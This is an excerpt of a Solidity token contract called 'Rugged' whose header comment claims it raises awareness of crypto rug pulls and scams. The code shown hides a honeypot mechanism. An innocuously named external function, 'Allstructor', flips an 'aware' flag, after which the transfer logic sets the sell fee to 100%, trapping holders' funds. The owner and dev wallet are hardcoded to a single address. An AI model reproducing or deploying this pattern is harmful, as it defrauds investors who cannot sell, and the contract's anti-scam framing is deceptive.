/*
Rugged will unite individuals who have experienced rug pulls and scams in the space.
 Rugged aims to raise awareness about scams, provide information and foster a more secure environment for investors and the community.
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0x71a7653D057755ef7E5C287021163a94b78e7033;
...
contract Rugged is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x71a7653D057755ef7E5C287021163a94b78e7033);
  ...
  //   TOKEN DETAILS
    ...
    */
    ...
    function Allstructor () external virtual {
        aware = 1;
    } 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = (aware <= 0 ? _sellFee:100);}
